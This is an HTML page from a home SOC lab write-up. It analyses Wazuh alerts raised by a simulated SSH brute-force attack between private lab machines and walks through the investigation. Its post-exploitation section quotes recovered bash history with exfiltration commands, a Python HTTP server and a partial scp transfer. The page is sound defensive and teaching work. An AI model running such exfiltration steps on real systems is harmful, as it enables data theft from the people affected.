@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Part 3: Detection — Home SOC Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+<div class="wrapper">
+
+  <a href="soc-lab-overview.html" class="back-link">Back to overview</a>
+
+  <header class="part-header fade-in">
+    <div class="eyebrow">Part 03 — Detection</div>
+    <h1>Wazuh Alert Analysis &amp;<br><span>Incident Investigation</span></h1>
+  </header>
+
+  <!-- 3.1 Alert Overview -->
+  <section class="section-block fade-in">
+    <h2>3.1 &nbsp;Alert Overview</h2>
+
+    <p>
+      The Wazuh SIEM generated <strong>500+ total alerts</strong> during the attack
+      simulation period, categorized as follows:
+    </p>
+
+    <div class="severity-grid">
+      <div class="severity-card sev-critical">
+        <div class="severity-label">Critical</div>
+        <div class="severity-count">0</div>
+        <div class="severity-rule">Level 15+</div>
+      </div>
+      <div class="severity-card sev-high">
+        <div class="severity-label">High</div>
+        <div class="severity-count">2</div>
+        <div class="severity-rule">Level 12–14</div>
+      </div>
+      <div class="severity-card sev-medium">
+        <div class="severity-label">Medium</div>
+        <div class="severity-count">188</div>
+        <div class="severity-rule">Level 7–11</div>
+      </div>
+      <div class="severity-card sev-low">
+        <div class="severity-label">Low</div>
+        <div class="severity-count">318</div>
+        <div class="severity-rule">Level 0–6</div>
+      </div>
+    </div>
+
+    <div class="callout-high callout">
+      <div class="callout-icon">↑</div>
+      <p>
+        The 2 High severity alerts directly correspond to the simulated brute force
+        attack and subsequent unauthorized access.
+      </p>
+    </div>
+
+    <!-- IMAGE 1 -->
+    <div class="img-block">
+      <img
+        src="images/Part3/alert-overview.png"
+        alt="Wazuh dashboard alert severity overview"
+        onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+      >
+      <div class="img-placeholder" style="display:none;">
+        <div class="img-placeholder-icon">[ img ]</div>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--text-dim);">images/alert-overview.png</span>
+      </div>
+      <div class="img-caption">FIG 3.1 — Wazuh dashboard alert severity overview</div>
+    </div>
+  </section>
+
+  <!-- 3.2 Brute Force Detection -->
+  <section class="section-block fade-in">
+    <h2>3.2 &nbsp;Brute Force Detection</h2>
+
+    <p>
+      Filtering Wazuh alerts by attacker IP <code>192.168.100.86</code> revealed
+      <strong>17 events</strong> generated during the attack window — confirming Wazuh
+      successfully tracked the entire brute force sequence.
+    </p>
+
+    <p>
+      Both High severity alerts <span class="rule-badge">Rule Level 12</span> were
+      triggered by the same rule:
+    </p>
+
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Field</th>
+          <th>Value</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Rule Description</td>
+          <td>Multiple authentication failures followed by a success</td>
+        </tr>
+        <tr>
+          <td>Rule Level</td>
+          <td><span class="rule-badge">12 — High</span></td>
+        </tr>
+        <tr>
+          <td>Attacker IP</td>
+          <td><code>192.168.100.86</code></td>
+        </tr>
+        <tr>
+          <td>Target User</td>
+          <td><code>target</code></td>
+        </tr>
+        <tr>
+          <td>Target Host</td>
+          <td><code>victim-vm (192.168.100.87)</code></td>
+        </tr>
+        <tr>
+          <td>Protocol</td>
+          <td><code>SSH</code></td>
+        </tr>
+        <tr>
+          <td>First Alert</td>
+          <td><span class="muted">May 25, 2026 @ 17:55:24 UTC</span></td>
+        </tr>
+        <tr>
+          <td>Second Alert</td>
+          <td><span class="muted">May 25, 2026 @ 17:59:09 UTC</span></td>
+        </tr>
+        <tr>
+          <td>Compliance</td>
+          <td>
+            <span class="compliance-tag">PCI DSS 10.2.4</span>
+            <span class="compliance-tag">PCI DSS 10.2.5</span>
+            <span class="compliance-tag">PCI DSS 11.4</span>
+            <span class="compliance-tag">HIPAA 164.312.b</span>
+            <span class="compliance-tag">TSC CC6.1</span>
+            <span class="compliance-tag">TSC CC6.8</span>
+            <span class="compliance-tag">TSC CC7.2</span>
+            <span class="compliance-tag">TSC CC7.3</span>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- IMAGE 2 -->
+    <div class="img-block">
+      <img
+        src="images/Part3/High.png"
+        alt="Wazuh Discover showing both High severity alerts"
+        onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+      >
+      <div class="img-placeholder" style="display:none;">
+        <div class="img-placeholder-icon">[ img ]</div>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--text-dim);">images/high-alerts.png</span>
+      </div>
+      <div class="img-caption">FIG 3.2a — Wazuh Discover showing both High severity alerts</div>
+    </div>
+
+    <!-- IMAGE 3 -->
+    <div class="img-block">
+      <img
+        src="images/Part3/investigatingLowLevel.png"
+        alt="Wazuh showing 17 hits filtered by attacker IP"
+        onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+      >
+      <div class="img-placeholder" style="display:none;">
+        <div class="img-placeholder-icon">[ img ]</div>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--text-dim);">images/17-hits.png</span>
+      </div>
+      <div class="img-caption">FIG 3.2b — Wazuh showing 17 hits filtered by attacker IP</div>
+    </div>
+  </section>
+
+  <!-- 3.3 Post-Exploitation Activity -->
+  <section class="section-block fade-in">
+    <h2>3.3 &nbsp;Post-Exploitation Activity</h2>
+
+    <p>
+      Following successful authentication, bash history recovered from the compromised
+      endpoint revealed the full scope of post-exploitation activity:
+    </p>
+
+    <div class="code-block">
+      <div class="code-label">bash — recovered history</div>
+      <pre>cat sensitive_data.txt          <span class="comment"># file enumeration</span>
+python3 -m http.server 8080     <span class="comment"># HTTP exfiltration attempt</span>
+scp target@192.168.100.162:...  <span class="comment"># file exfiltration via SCP</span>
+logout                          <span class="comment"># session termination</span></pre>
+    </div>
+
+    <div class="callout">
+      <div class="callout-icon">!</div>
+      <p>
+        The attacker attempted multiple exfiltration methods — both HTTP server and SCP
+        — indicating deliberate data theft rather than accidental access.
+      </p>
+    </div>
+
+    <!-- IMAGE 4 -->
+    <div class="img-block">
+      <img
+        src="images/Part3/bash-history.png"
+        alt="Bash history showing post-exploitation commands"
+        onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+      >
+      <div class="img-placeholder" style="display:none;">
+        <div class="img-placeholder-icon">[ img ]</div>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--text-dim);">images/bash-history.png</span>
+      </div>
+      <div class="img-caption">FIG 3.3 — Bash history showing post-exploitation commands</div>
+    </div>
+  </section>
+
+  <!-- Part navigation -->
+  <nav class="part-nav">
+    <a href="part2.html" class="nav-btn prev">Part 2: Attack Simulation</a>
+  </nav>
+
+</div>
+</body>
+</html>
